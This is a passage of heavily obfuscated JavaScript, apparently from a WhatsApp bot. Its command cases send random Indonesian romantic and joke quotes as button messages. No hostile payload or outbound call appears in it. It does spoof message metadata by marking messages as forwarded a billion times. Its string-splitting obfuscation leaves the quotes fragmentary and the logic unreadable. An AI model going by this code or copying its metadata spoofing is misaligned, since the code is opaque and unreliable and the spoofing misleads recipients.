d,0x6c6)+_0x593f96(0x966,0x5f9,0x498,0x611),'Tak\x20semua\x20'+_0x1e23e4(0x721,0x8ce,0x6ef,0xa85)+_0x593f96(0x956,0xca9,0x4e6,0xa8b)+_0x593f96(0x988,0xdd7,0x8d6,0x8ce)+_0x593f96(0x659,0x5cc,0x406,0x469)+_0x1e23e4(0x8af,0xb7e,0x7b8,0x795)+_0x1e23e4(0x91f,0x589,0x598,0x9b7)+_0x1e23e4(0x69e,0x284,0x58a,0x3f0)+'\x20ku\x20ulang\x20'+'kembali,\x20a'+_0x1e23e4(0x422,0x561,0x841,0xbc7),'Jangan\x20rin'+_0x1e23e4(0x649,0x59a,0x5db,0x7b6)+'rat.\x20Kau\x20t'+_0x593f96(0xb69,0xfb8,0x8ce,0xb84)+_0x1e23e4(0x104,0x8de,0x582,0x66b)+_0x593f96(0x7fb,0x740,0xcb2,0x593),_0x1e23e4(0x35e,0x850,0x79f,0x8dd)+_0x1e23e4(0x6d2,0x4e5,0x74b,0x735)+_0x1e23e4(0xb68,0x2de,0x7ca,0x655)+_0x593f96(0x6f5,0x835,0x7ee,0x71e)+_0x1e23e4(-0x60,-0x3b,0x1ba,-0x226)+_0x593f96(0x512,0x73d,0x183,0x911)+_0x593f96(0x420,0x45,0x85b,0x277),_0x593f96(0x9e5,0xc38,0x95d,0xa92)+_0x1e23e4(0x9e3,0x99b,0x79e,0xb6a)+_0x593f96(0x702,0x797,0x9c6,0x253)+_0x593f96(0x798,0x99f,0x815,0x2e7)+'.\x20Sebab\x20ji'+'ka\x20aku\x20sak'+'it,\x20lalu\x20s'+'iapa\x20yang\x20'+_0x593f96(0x80e,0x3fe,0xa68,0x997)+_0x1e23e4(0xc7e,0xb9f,0x77c,0xa24),'Kalau\x20menc'+_0x593f96(0x8e0,0x3c7,0x55a,0x91d)+_0x593f96(0x4ef,0x996,0x212,0x473)+_0x593f96(0x77a,0x5b0,0x3a4,0xbb9)+_0x593f96(0x488,0xa6,0x740,0x960)+'\x20Aku\x20salah'+_0x593f96(0x5f3,0x98a,0x4f8,0x9a9)+'a.',_0x593f96(0x80b,0x9b7,0x4bd,0xa2e)+'ah\x20merindu'+'kanmu.\x20Leb'+_0x1e23e4(0x960,0x1f4,0x56a,0x14b)+'ri\x20Matemat'+'ika.\x20Lebih'+_0x1e23e4(0x2ec,0x259,0x31c,0x153)+_0x1e23e4(0x3d4,0x491,0x6df,0x63a)+'ebih\x20keras'+_0x1e23e4(0x2f2,0x2b9,0x115,-0x125)+'logi.',_0x1e23e4(0x9b1,0x720,0x79f,0x407)+'\x20ninggalin'+_0x593f96(0x955,0x80e,0xd37,0xdf1)+_0x1e23e4(0x42,0x2b5,0x440,0x4ee)+'asal\x20janga'+'n\x20aku\x20yang'+_0x1e23e4(0x4cc,0x910,0x629,0x3e8)+'\x20kamu.\x20Aku'+_0x593f96(0x785,0x93c,0x351,0x3ff)+'u\x20kecewa.',_0x593f96(0xca6,0xef5,0x95d,0x7c0)+'ndai\x20cembu'+_0x593f96(0x652,0x7ae,0x5a4,0x5f9)+_0x1e23e4(0x74f,-0x17c,0x38a,-0x96)+_0x1e23e4(0x56f,0xa88,0x8ff,0x840)+_0x1e23e4(0xbf3,0x5d1,0x785,0xb41)+_0x1e23e4(0x9f5,0x436,0x84d,0xa7f)+_0x593f96(0x965,0x6bb,0x52a,0xa0d)+_0x593f96(0x9a4,0xdee,0x69f,0x902)+_0x1e23e4(0x787,0x498,0x38d,0x7c9)+_0x1e23e4(-0x288,-0xf4,0x12b,0x33a),_0x593f96(0x2ea,-0x10b,0x123,0x5f)+_0x593f96(0x6b7,0x1a0,0x8fc,0x484)+_0x593f96(0x7dd,0xb9c,0x7a3,0xa07)+_0x1e23e4(0x857,0x922,0x6e7,0x7a6)+_0x593f96(0xad6,0xf7b,0x626,0x95a)+_0x593f96(0x591,0x3d5,0x7cd,0x93c),_0x593f96(0xa92,0xa5f,0x690,0xdf7)+'ku\x20mungkin'+_0x1e23e4(0x1ad,0x2a2,0x316,0x2c4)+_0x593f96(0x8ac,0xbfa,0x684,0xc0e)+',\x20waktu\x20me'+_0x1e23e4(0xb64,0x249,0x727,0x4b0)+'pergi,\x20tet'+'api\x20perasa'+_0x593f96(0xb6a,0x962,0xb4c,0xb6d)+_0x593f96(0xbbb,0xbe4,0xf93,0x7c5)+_0x1e23e4(0x30e,0x4f4,0x368,0x2d0)+'ar,\x20hingga'+'\x20ke\x20depan.',_0x1e23e4(0x5b0,-0xda,0x15d,0x48b)+_0x1e23e4(0xacb,0x9ad,0x5df,0x34c)+_0x593f96(0x5e8,0x580,0x3c0,0x6b0)+_0x593f96(0x3ab,0x66a,-0x158,0x7a9)+'\x20hidupku.\x20'+_0x1e23e4(0x474,0x255,0x42e,0x388)+'aja\x20membia'+_0x1e23e4(0x31e,0xca3,0x7a8,0xba7)+_0x1e23e4(0x3e3,-0x12c,0x296,-0xda)+_0x593f96(0x6e9,0x467,0x835,0x2b2)+_0x593f96(0xb2f,0xff8,0xb86,0xce3)+'\x20tetapi\x20ti'+_0x1e23e4(0x7bb,0x6fe,0x4f2,0x50d)+'hal\x20yang\x20a'+_0x1e23e4(0x9ff,0x38d,0x79c,0x36b)+_0x1e23e4(0xdb5,0xb83,0xa7a,0x6f7)+_0x1e23e4(0x83,0x6d2,0x432,0x83)],si=cc[Math[_0x593f96(0x46e,0x11c,0x24d,0xf3)](Math['random']()*cc['length'])],_0x39da22={};_0x39da22['displayTex'+'t']='☠️\x20Owner\x20';const _0x495362={};_0x495362[_0x593f96(0x3de,-0x12f,0x210,0x7e9)]=_0x1e23e4(-0x22e,0x6e4,0x279,0x4ce),_0x495362[_0x1e23e4(0x1d,-0xa,0xc6,0x464)]=_0x39da22,_0x495362[_0x593f96(0xb7e,0x954,0xf58,0x960)]=0x1;const _0x4cd4c9={};_0x4cd4c9['displayTex'+'t']=_0x593f96(0x314,0x61d,-0xda,-0x11d);const _0x3fc954={};_0x3fc954[_0x593f96(0x3de,0x448,0x473,0x5a1)]=''+command,_0x3fc954[_0x1e23e4(-0x2a5,0x34f,0xc6,-0xe2)]=_0x4cd4c9,_0x3fc954[_0x593f96(0xb7e,0xc7b,0x7c0,0xbdf)]=0x1;var buttonns=[_0x495362,_0x3fc954];buttonMessage={'contentText':si,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x593f96(0x8e3,0x8c9,0xd47,0x460)+_0x1e23e4(-0x36f,-0x18d,0xd7,0x4d4)+_0x1e23e4(0xa54,0xb68,0x9eb,0x547))+enter+_0x593f96(0xa48,0x9e3,0xc21,0x83b)+sender[_0x593f96(0x311,-0xc8,-0x18a,0x1f6)]('@')[-0x10d9+0x535+0xba4],'buttons':buttonns,'headerType':0x1};const _0x4d472a={};_0x4d472a[_0x593f96(0xc48,0x1099,0xb1c,0x78d)]='hi',_0x4d472a['forwarding'+'Score']=0x3b9aca00,_0x4d472a[_0x1e23e4(0xc24,0xd10,0xaaf,0x773)+'d']=!![],_0x4d472a[_0x1e23e4(0x67,-0xcd,0x142,0x6c)+_0x1e23e4(-0x198,-0x9b,0x1e4,-0x1b6)]=!![],_0x4d472a['mentionedJ'+'id']=[sender];const _0x3ca994={};_0x3ca994[_0x1e23e4(0x7b5,0x5e3,0x3fc,0x50c)]='Botwea\x20©2k'+'21',_0x3ca994[_0x593f96(0xaa4,0xbbb,0x8a0,0x8b4)+'o']=_0x4d472a,_0x3ca994['quoted']=ftoko,_0x3ca994['sendEpheme'+_0x593f96(0x3c2,0x3bf,0x816,0x5e2)]=!![],alpha['sendMessag'+'e'](from,buttonMessage,MessageType[_0x1e23e4(-0x17f,0xba,0x30b,0x1be)+'sage'],_0x3ca994);break;case _0x593f96(0x50f,0xc3,0x4a9,0x16f)+_0x1e23e4(0x5e9,0x10,0x454,0x36d):const kata_lucu=['“Orang\x20bij'+_0x593f96(0x9e6,0x728,0x6a3,0x91a)+_0x1e23e4(0x2cb,0x1e7,0x337,0x803)+_0x1e23e4(0x8b2,0x69b,0x60f,0x721)+_0x593f96(0x5c1,0x8fb,0x421,0x4f5)+_0x593f96(0xbb5,0x761,0xec1,0x6a5)+_0x593f96(0x34e,0x54b,0x3c9,-0x181)+'ana\x20dan\x20bi'+_0x593f96(0x8d2,0xabd,0x9d4,0xca6),_0x1e23e4(0x864,0xca1,0x8fd,0x7c7)+_0x1e23e4(0x799,0xae5,0x9bd,0x91f)+_0x593f96(0x638,0x342,0x7f4,0x195)+_0x1e23e4(0x1f5,-0xc4,0x34b,0x389)+_0x593f96(0x658,0x390,0x7b4,0x66d)+'gan\x20adalah'+_0x1e23e4(-0x8,0x545,0x1dd,-0x222)+_0x1e23e4(-0x82,0x119,0x16f,0xb9)+_0x1e23e4(0xe65,0x7d3,0xaab,0xb54),'“Ingin\x20hat'+_0x593f96(0x9e1,0xedb,0xdcc,0x605)+_0x593f96(0x746,0x5e2,0x4dd,0xa19)+'api\x20apa\x20da'+_0x593f96(0x60a,0x213,0x419,0x27f)+'etangga.”','“Tidak\x20ada'+'\x20pekerjaan'+_0x1e23e4(0x62a,0xa2d,0x684,0x7b4)+'t\x20di\x20dunia'+_0x593f96(0xa04,0x99c,0xd2b,0x5f9)+'rjaan\x20sebe'+_0x593f96(0x416,-0xe0,0x2b0,-0x45)+_0x1e23e4(0xcf5,0x418,0x7f4,0xa5d)+'sa\x20ringan\x20'+_0x593f96(0xb07,0x7e9,0x655,0xa5e)+_0x1e23e4(0x3f6,0x16c,0x637,0x8d8)+_0x593f96(0x9d5,0x94f,0xb87,0x8f6),_0x593f96(0x66c,0x7bb,0xb03,0x4ec)+'adi\x20pagi\x20a'+_0x1e23e4(0x793,0x16e,0x41d,0x867)+_0x1e23e4(0x75f,0x9d2,0x75e,0x90e)+_0x1e23e4(0x8c3,0x783,0x40e,-0x101)+_0x593f96(0xa17,0xba8,0x6df,0x787)+_0x1e23e4(0xa36,0x7d4,0x8c7,0xd1f)+_0x593f96(0x7f1,0x511,0xa07,0xa8a)+_0x593f96(0x4dd,0x925,0x8ad,0x723)+_0x1e23e4(0xcf2,0xb92,0x94c,0xa27)+'ikirkan\x20ka'+_0x1e23e4(0x869,0xd80,0x94e,0x65b)+_0x1e23e4(0x957,0x810,0x61f,0x868)+_0x593f96(0x993,0x622,0x9ec,0xc94)+_0x1e23e4(0x834,0x549,0x4f8,0x597)+_0x1e23e4(0x4d5,0xc1e,0x8c2,0xbb1)+'aran.”',_0x593f96(0x2c0,0x75b,0x2b3,-0x24e)+_0x1e23e4(-0x1b0,0x402,0x2f8,0x15b)+_0x1e23e4(0x429,0x6a0,0x744,0xb0d)+_0x593f96(0xc3c,0x92e,0xd1f,0xa55)+_0x1e23e4(0x647,0x8bc,0x819,0x9a3)+_0x1e23e4(0x875,0x866,0x707,0x452)+_0x593f96(0xb56,0xdc5,0x1046,0x940)+_0x1e23e4(0x867,0xbaa,0xa1f,0x73d)+_0x593f96(0x484,0x217,0x8cb,0x53)+_0x1e23e4(0x8b,0x26f,0x18c,-0xb3)+_0x1e23e4(0x254,0x3f1,0x4b2,0x356)+'eninggal\x20s'+_0x1e23e4(0x3a9,0x354,0x632,0x426)+'bayi.”',_0x1e23e4(0x34a,0x980,0x4ed,0x432)+'n\x20itu\x20bera'+_0x593f96(0x9b4,0x8f5,0xc14,0xbd7)+_0x1e23e4(0x57,0x7ef,0x527,0x74e)+'an,\x20dan\x20im'+_0x1e23e4(0x4ed,0x7f4,0x7ef,0x5f9)+'\x20disaat\x20ki'+'ta\x20tidur.\x20'+_0x593f96(0xbf2,0xf57,0xac7,0xf2c)+_0x593f96(0x8d9,0x4c2,0x6f3,0x900)+_0x1e23e4(0x5f,0x4bf,0x288,0xd)+_0x593f96(0x2f2,0x3b,0x53c,0x47c)+'ebih\x20baik\x20'+'tidurlah\x20s'+_0x1e23e4(0xae1,0x14f,0x5d3,0x424)+'ga”',_0x593f96(0x366,0x46d,0x7b4,0x321)+_0x1e23e4(0xe0d,0x870,0x908,0x615)+'bukanlah\x20j'+'aminan\x20unt'+_0x593f96(0x4de,0x76b,0x204,0x6af)+_0x593f96(0xa8c,0xeb0,0xdbb,0x99b)+'hagia\x20dan\x20'+_0x1e23e4(-0xfe,0x369,0x33c,0x4dd)+_0x1e23e4(0x2f9,0x42b,0x5cf,0x98f)+_0x593f96(0xa90,0xcd8,0x677,0xde4)+_0x1e23e4(0x3a3,0x5d4,0x7db,0x306)+_0x593f96(0x7f7,0x8b2,0x2f4,0x385),_0x593f96(0xa3d,0xc62,0xb64,0xe64)+_0x593f96(0x371,0x100,0x453,0x618)+_0x1e23e4(-0xc2,0x26b,0x354,0xd0)+'apat\x20kentu'+_0x1e23e4(0xb38,0x647,0xa9c,0x8b4)+'t.”',_0x593f96(0x335,0x520,0x56e,0xa5)+_0x1e23e4(0x961,0xb79,0x65f,0x63f)+_0x593f96(0x4b8,0x8a6,0x880,0x85b)+_0x1e23e4(0x3d0,0x3ea,0x250,0x28b)+_0x1e23e4(0xcc,-0x231,0x217,0x9e)+_0x1e23e4(0x53b,-0x110,0x14b,-0x3a),_0x593f96(0xa94,0xc9d,0x8bc,0xb7a)+_0x593f96(0x5b4,0x2b5,0x56d,0x4bd)+_0x593f96(0x752,0xbbd,0x3d2,0x943)+_0x593f96(0x9b6,0xd4b,0x9e8,0xbfc)+_0x1e23e4(0x743,0xea0,0x9f6,0xeea)+'a.”',_0x1e23e4(0x108,-0xc,0x2bc,0x7d5)+_0x593f96(0x2b6,0x789,0x750,0x2ca)+_0x593f96(0x8d5,0xa97,0xbc0,0xd01)+_0x593f96(0x857,0xa92,0xa3d,0x953)+'adalah\x20ban'+'gun\x20dari\x20t'+_0x593f96(0x4ee,0x262,-0x1a,0x9de)+_0x1e23e4(0x935,0x94d,0x912,0x7e8),_0x593f96(0xcaf,0x10f2,0x1181,0xa68)+_0x593f96(0xa0a,0xc6a,0x701,0x8f1)+_0x1e23e4(0xd4,0x9cd,0x569,0x4c9)+_0x1e23e4(0x55f,0x51e,0x539,0x954)+'itu\x20tai,\x20j'+_0x1e23e4(0x6d9,0x7fd,0x61c,0xad1)+'iam\x20cepiri'+'t.”',_0x1e23e4(0xb8f,0x56c,0x9ea,0xdc4)+_0x593f96(0x525,0xdf,0x9c2,0x6a2)+'kesuksesan'+',\x20maka\x20tem'+_0x593f96(0x753,0x64a,0x65f,0xa50)+_0x593f96(0x50a,0x78f,0x4a4,0x666)+_0x593f96(0xc3a,0x8eb,0xba5,0xdf2)+_0x593f96(0xa4f,0x5e4,0x93c,0x5b8)+_0x593f96(0xbfb,0xcba,0xed4,0xd29)+'\x20ketika\x20ka'+_0x1e23e4(-0x80,0x18,0x37b,0x1e)+_0x1e23e4(0x484,0x3d7,0x2d6,0x3fc)+_0x593f96(0x780,0x939,0x493,0xb0b)+'\x20saja\x20tema'+_0x593f96(0x456,0x3ca,0x948,0x41a)+_0x1e23e4(0x670,0x44b,0x5aa,0x89b)+'awakan.”',_0x593f96(0xb03,0xe14,0x6b7,0xfdf)+_0x1e23e4(0x39a,0x387,0x645,0x592)+_0x593f96(0x9f6,0xd3a,0x61c,0x4df)+_0x1e23e4(0x3d4,0x75f,0x6ec,0x5e6)+'k\x20solusiny'+_0x593f96(0x354,0x707,0x4f2,0x444)+_0x593f96(0xc23,0x918,0x876,0x9e6)+_0x1e23e4(0x4c3,-0x18e,0x168,0x330)+'ya,\x20maka\x20g'+_0x1e23e4(0x5aa,0x336,0x5a4,0x9fd)+_0x1e23e4(0x740,0x917,0x997,0x4a4)+_0x593f96(0x49e,0x5fb,0x711,0x6e4)+_0x593f96(0x550,0x71f,0x57,0x679),'“Jika\x20kepi'+_0x1e23e4(0x4aa,0x51f,0x824,0xb37)+_0x593f96(0xb4f,0x7a9,0xcde,0xde5)+_0x1e23e4(0x985,0x470,0x8ab,0x8a3)+_0x1e23e4(0x743,0x849,0x67c,0x56a)+_0x1e23e4(0x61a,0x111,0x3ee,-0xd8)+_0x1e23e4(0x2c1,0x77c,0x5e3,0x8ed)+'g,\x20maka\x20bi'+_0x1e23e4(0xa8d,0x9bb,0x578,0x517)+_0x593f96(0x686,0xaa3,0xa84,0xb2c)+_0x593f96(0x8d6,0x754,0x924,0x498)+_0x593f96(0x9fb,0xd2d,0x782,0xeb3),_0x1e23e4(0x8a0,0x6,0x433,0x8f4)+_0x1e23e4(0xa1e,0x6e0,0xaa1,0x699)+_0x1e23e4(0x235,0x83f,0x747,0x79d)+_0x593f96(0x78d,0x31f,0xb7b,0xc2a)+'enguasai\x20p'+_0x593f96(0xc6c,0x859,0xc99,0xbc0)+_0x593f96(0x721,0x43f,0x6ff,0x2c8)+_0x593f96(0x875,0x3c2,0xce8,0x402)+_0x1e23e4(0x737,0x7cd,0x3bf,0x250)+_0x593f96(0x47e,0x86,0x40,0x194)+_0x593f96(0x310,0x34,-0xfe,-0x51)+_0x593f96(0xac7,0x5cd,0xa3a,0xead)+_0x1e23e4(0x3,-0x32c,0x199,0x227)+_0x1e23e4(0x3f4,-0x68,0x383,0x362),_0x1e23e4(0xc75,0xc20,0x8fd,0x868)+_0x593f96(0xb9b,0xfcc,0xd9d,0xbe6)+_0x593f96(0xa7d,0xbe3,0xe01,0x650)+'\x20yang\x20tert'+'unda\x20maka\x20'+_0x1e23e4(0x278,-0x8,0xfa,-0x19d)+_0x593f96(0xb9b,0xbb3,0x1045,0xf06)+'jujuran\x20ya'+_0x1e23e4(0xa94,0xae6,0xad9,0x8bd)+_0x593f96(0x378,0x432,0x5f4,0x31c),_0x593f96(0x63f,0xaee,0x246,0x6c7)+_0x1e23e4(-0x44,0x6b1,0x256,0x4c5)+_0x1e23e4(0x364,0x915,0x817,0x63c)+_0x1e23e4(0x630,0x560,0x2e2,0x149)+_0x593f96(0x3cb,-0x4,0x740,0x67f)+_0x1e23e4(0x823,0xd66,0xa52,0xd04)+_0x593f96(0x471,0x471,0x700,0xd6)+_0x1e23e4(0x23c,0x4c4,0x1eb,0x33)+_0x593f96(0xc5a,0xeb5,0xf49,0xc12)+_0x593f96(0xa85,0xf08,0x967,0x9ce)+'\x20Valery.',_0x593f96(0xae2,0x7a8,0xad6,0xbbf)+_0x1e23e4(0xaaf,0x3d2,0x634,0x9b3)+'engan\x20hart'+_0x1e23e4(-0x8,0x437,0x3c8,0x501)+_0x1e23e4(-0x1e4,-0x85,0x110,0xf7)+_0x593f96(0xa4a,0xa9c,0x964,0xc5a)+_0x1e23e4(0x67d,0xadc,0x94f,0x79d)+_0x1e23e4(0xc45,0xed9,0xad4,0xdd7),'“Pakaian\x20i'+_0x593f96(0x30d,0x11d,0x1f3,0x55)+_0x1e23e4(0x790,0x67,0x48f,0x66f)+_0x1e23e4(-0xa9,0x86b,0x40c,0x2a4)+_0x593f96(0x4a4,0x135,-0x52,0x2e3)+'nya\x20melind'+_0x593f96(0x78e,0x742,0x2c1,0x4b1)+'\x20menghalan'+_0x1e23e4(0x775,0x5c0,0x96f,0x75c)+'ngan\x20yang\x20'+_0x1e23e4(0x5a9,0x6bf,0x7f5,0xa5b),_0x593f96(0x571,0x585,0x4a5,0x86)+_0x1e23e4(0x5d9,-0x9,0x1e5,-0xfb)+'u\x20berenang'+_0x593f96(0x3e2,0x4a8,0x7da,0x20a)+_0x593f96(0x63d,0x38d,0x9fe,0x8ec)+_0x593f96(0x6c2,0x1f0,0x4a0,0x9e1)+_0x593f96(0xc22,0xd3c,0xe8c,0xbd1)+_0x593f96(0xb57,0x78d,0x1062,0xbc4)+_0x1e23e4(0x200,0x19,0x1f1,0x8a)+_0x593f96(0x990,0x9bc,0x93c,0xc89),_0x1e23e4(-0x34,0x44a,0xc7,-0x1fb)+_0x1e23e4(0x827,0x731,0x5b6,0x219)+_0x593f96(0x4e0,0x5e4,0x3c7,0x25c)+_0x593f96(0x5ff,0x9ea,0x3af,0x247)+_0x593f96(0xb70,0x9d1,0x1000,0x1079)+_0x593f96(0x4ad,0x21e,0x362,0x8f0)+_0x1e23e4(0x88a,0x793,0x96e,0xd9b)+_0x593f96(0xbfc,0xed1,0x97c,0x8a1)+_0x1e23e4(0xa0d,0x345,0x616,0xa09)+_0x593f96(0xc7d,0x1029,0xc8a,0x1005)+_0x1e23e4(0x255,0x42f,0x291,0x2a8),_0x593f96(0xb06,0x776,0xc9c,0xc50)+_0x593f96(0x3d9,0x57e,0x517,0x91)+'ta\x20menjadi'+_0x1e23e4(0x473,0x8cb,0x795,0x601)+'\x20tapi\x20tida'+_0x593f96(0xcae,0xe63,0xd4d,0x977)+_0x1e23e4(0xa71,0x749,0x618,0x812)+'empurna,\x20j'+_0x593f96(0xa47,0xb96,0xada,0x544)+_0x1e23e4(0x65c,0x8d2,0x90f,0x5bb)+_0x593f96(0xc4d,0xb99,0x1123,0x111e)+_0x1e23e4(0x8be,0x3e9,0x3f6,0x27c),'“Gara\x20gara'+_0x1e23e4(0xc08,0x4af,0x905,0xa74)+_0x1e23e4(0x8e8,0x47,0x4af,0x901)+_0x593f96(0x3b2,-0x124,0x23b,0x119)+_0x1e23e4(-0x1ba,0x2f,0xea,-0xc2)+_0x593f96(0x85c,0x76a,0x503,0x5f6)+_0x593f96(0x8de,0xca3,0x689,0x4de)+_0x593f96(0x3c5,0x4b6,0x4cf,0x44d)+_0x1e23e4(0x482,0x50f,0x947,0xafd)+'lana.”','“Semakin\x20b'+_0x593f96(0x423,0x58f,0x51f,0x749)+_0x593f96(0x90e,0xc9d,0xda8,0xcc0)+'in\x20banyak\x20'+_0x593f96(0x8cd,0x5e6,0xb90,0xd0e)+_0x1e23e4(0x4a2,0x488,0x692,0xa37)+_0x593f96(0x799,0x35d,0xa67,0x84a)+_0x1e23e4(0x623,0x5f9,0x772,0x47c)+_0x593f96(0xa00,0xe4a,0xd82,0x720)+_0x1e23e4(0x7be,0x530,0x2a3,-0x1bc)+_0x593f96(0x5c3,0x2bc,0x69c,0x6bf)+_0x1e23e4(0x87e,0xcb,0x5de,0x2dd)+_0x1e23e4(0x73e,0x361,0x413,0x33d)+_0x593f96(0x533,0xb2,0x648,0x61c)+_0x593f96(0x67f,0x9d4,0x9f2,0x37f)+'emakin\x20sed'+_0x1e23e4(0x966,0xc47,0x7bf,0x537)+_0x1e23e4(0xa,0x390,0x41e,-0xcb)+_0x593f96(0x369,0x877,0x2e5,0x115)+_0x1e23e4(0x5e4,0x78c,0x571,0xa5d)+_0x1e23e4(0x2c5,0x64f,0x4a7,0x1be)+_0x1e23e4(0x63f,0xd37,0x9a3,0xb56),_0x593f96(0x724,0x5f0,0x49e,0x7ad)+'\x20dilempar\x20'+'batu\x20oleh\x20'+_0x593f96(0x98f,0x9ea,0xe23,0x65d)+_0x593f96(0x734,0x316,0x5fa,0x6e9)+_0x593f96(0x41c,0x3bf,0x7f0,0x449)+_0x1e23e4(0x737,0x8cd,0x488,0x6ff)+_0x593f96(0x882,0x8f1,0x56a,0x7c2)+_0x593f96(0x8c3,0x972,0xa67,0x870)+_0x1e23e4(0xbf3,0xd9c,0x91f,0x9df)+'n\x20dan\x20lemp'+'ar\x20bunga\x20k'+_0x1e23e4(0x182,0x891,0x4c4,0x156)+'\x20Tapi\x20usah'+'akan\x20potny'+_0x593f96(0x477,0x794,0x2ce,0x81a)+_0x1e23e4(0x5f0,0x63b,0x648,0x152),_0x1e23e4(0x584,-0x154,0x362,0x5a6)+_0x593f96(0xa09,0x6cf,0xe33,0x73c)+_0x1e23e4(0x117,0x1c6,0x4b1,0x4ac)+_0x593f96(0xb39,0x715,0xcc3,0xe98)+_0x593f96(0x7f2,0xc0d,0x8f2,0x85e)+_0x1e23e4(0xbaa,0x501,0x880,0x66b)+'gkan,\x20apal'+'agi\x20yang\x20j'+_0x1e23e4(0x534,0x8fb,0x884,0x579),'“Carilah\x20i'+_0x1e23e4(0x832,0xd3c,0xa94,0xec9)+_0x593f96(0xb41,0xe7f,0x695,0xfac)+_0x593f96(0xb0b,0xfb4,0x98d,0xb36)+_0x1e23e4(0xb80,0x524,0x9d6,0xeda)+_0x593f96(0x2b2,0x5c8,-0x18a,-0xfd)+_0x1e23e4(0xa43,0x26a,0x584,0x1b4)+_0x1e23e4(0x7f8,0x629,0x984,0x8ec)+_0x593f96(0x854,0x856,0x57b,0x408)+_0x593f96(0xcd5,0x884,0xb5e,0xdd4)+'lah\x20suami\x20'+_0x1e23e4(0x822,0x771,0xaf1,0xc29)+_0x1e23e4(0x6f9,-0x2d,0x227,0x1b6)+'em\x20Pakai\x20G'+_0x1e23e4(0x6b4,0x7d9,0x9fe,0x55c)+_0x1e23e4(0x494,0x50b,0x53d,0x50b),'“Tidak\x20ada'+_0x593f96(0xca8,0x8ef,0xacb,0x10a1)+_0x1e23e4(0x374,0x9d6,0x684,0x98d)+'t,\x20seberat'+_0x1e23e4(0x8ad,0x472,0x806,0x81c)+_0x593f96(0xc75,0xe6d,0x906,0xa4f)+_0x593f96(0xc10,0x94e,0xace,0xc22)+_0x1e23e4(0x475,0x1c5,0x4e9,0x455)+_0x1e23e4(0x45f,0x4f6,0x21a,0x649)+_0x593f96(0x3fe,0x20e,0x690,0x479)+_0x1e23e4(0x7cd,0xdf4,0x977,0x722)+_0x593f96(0x8f2,0x5b4,0x8f7,0x423)],kata_lucu_=kata_lucu[Math[_0x593f96(0x46e,0x2d5,0x7fe,0x167)](Math['random']()*kata_lucu[_0x1e23e4(0xadb,0xa34,0x90a,0x5ac)])],_0x4b1cdc={};_0x4b1cdc[_0x593f96(0x3bc,-0x95,0x822,0x566)+'t']=_0x593f96(0x2ac,0x687,0x148,0x20b);const _0x2e30cb={};_0x2e30cb[_0x593f96(0x3de,0x4a1,-0x93,0x2d8)]='owner',_0x2e30cb[_0x593f96(0x2a4,-0x115,0x386,0x335)]=_0x4b1cdc,_0x2e30cb[_0x593f96(0xb7e,0xcc5,0xe62,0xb28)]=0x1;const _0x487773={};_0x487773[_0x593f96(0x3bc,0x540,0x4c5,0x143)+'t']=_0x593f96(0x314,0x520,0x4c5,-0x16d);const _0x2b5cf1={};_0x2b5cf1[_0x1e23e4(0x53c,0x422,0x200,0x56)]=''+command,_0x2b5cf1[_0x1e23e4(0x59a,-0x2a2,0xc6,-0x3c3)]=_0x487773,_0x2b5cf1[_0x1e23e4(0x5d5,0x9b8,0x9a0,0x8f8)]=0x1;var buttonns=[_0x2e30cb,_0x2b5cf1];buttonMessage={'contentText':kata_lucu_,'footerText':''+tampilTanggal+enter+tampilWaktu+enter+enter+(_0x593f96(0x8e3,0x4e6,0x49f,0x811)+'more\x20quote'+_0x593f96(0xbc9,0x7e3,0xd40,0xd86))+enter+_0x1e23e4(0x9d7,0x379,0x86a,0x8ca)+sender['split']('@')[0xdee*-0x2+0x16f*0x7+0x11d3],'buttons':buttonns,'headerType':0x1};const _0x4fdc8f={};_0x4fdc8f[_0x1e23e4(0xbfa,0x569,0xa6a,0x6d2)]='hi',_0x4fdc8f[_0x1e23e4(0xc93,0x6b8,0x830,0x46c)+_0x1e23e4(0x9fe,0x9d3,0x608,0x55b)]=0x3b9aca00,_0x4fdc8f['isForwarde'+'d']=!![],_0x4fdc8f['sendEpheme'+_0x1e23e4(0x61f,0x42a,0x1e4,0x1f6)]=!![],_0x4fdc8f[_0x1e23e4(0x3c9,0x33f,0xcf,-0x79)+'id']=[sender];const _0x1962c5={};_0x1962c5[_0x593f96(0x5da,0x37f,0x718,0xa8f)]=_0x1e23e4(0x6d1,-0x5a,0x31f,0x3e3)+'21',_0x1962c5[_0x1e23e4(0x6a7,0x84e,0x8c6,0xb58)+'o']=_0x4fdc8f,_0x1962c5[_0x1e23e4(0xb2e,0x9d9,0x7b3,0xaad)]=ftoko,_0x1962c5[_0x593f96(0x320,0x58c,0x432,0x555)+_0x593f96(0x3c2,0x59a,0x3a1,0x625)]=!![],alpha[_0x1e23e4(0x17b,0x8b5,0x685,0x32b)+'e'](from,buttonMessage,MessageType[_0x593f96(0x4e9,0x80d,0x315,0x1f8)+_0x593f96(0xc5b,0x803,0xa5d,0xc47)],_0x1962c5);break;case _0x1e23e4(0x530,0x333,0x671,0x9e5)+_0x593f96(0x36f,0xe0,0x526,0x651):const longtong=[_0x593f96(0x428,0x5e3,0x70c,0x139)+_0x1e23e4(0x743,0x7d0,0x2f2,0x27d)+_0x593f96(0xcd2,0x8de,0x119f,0xdc8)+_0x1e23e4(0x88c,0x56a,0x852,0xc14)+_0x1e23e4(0xd88,0x81d,0x92f,0xb77)+'k\x20bicara\x20d'+_0x1e23e4(0xaf0,0xbbf,0x84e,0x3b7)+_0x1e23e4(0x6bf,0x6f9,0x999,0xcb8)+'lihatan',_0x1e23e4(0x814,0xf40,0xa72,0xd32)+'paling\x20tep'+'at\x20dan\x20nik'+'mat\x20untuk\x20'+_0x1e23e4(0xf39,0xea0,0xa3f,0x829)+_0x593f96(0x2a7,-0xaa,-0x1ed,-0x69)+'telah\x20kopi'+'\x20itu\x20jadi\x20'+_0x593f96(0x39d,0x22b,0x5a,0x711),_0x593f96(0x930,0x6bc,0xc94,0x43d)+_0x1e23e4(0x457,0xd99,0x902,0x451)+'a\x20sama\x20den'+_0x593f96(0x4ca,0x1f8,0x95c,0x947)+'ik\x20anak\x20ma'+_0x593f96(0xc2b,0xa17,0x10f2,0xad7)+'i,\x20mendidi'+_0x1e23e4(0x25a,0x169,0x263,-0xc2)+_0x1e23e4(0x98a,0x7ae,0x82e,0x563)+_0x1e23e4(0x39c,0xafd,0x769,0xbc3)+_0x1e23e4(0x44f,0x36d,0x740,0x2bb)+_0x593f96(0x601,0x46c,0x626,0xafb)+_0x593f96(0x987,0xda8,0xca0,0xe79),_0x593f96(0xaca,0x899,0xe37,0xc9f)+_0x1e23e4(0x308,0x154,0x44b,0x644)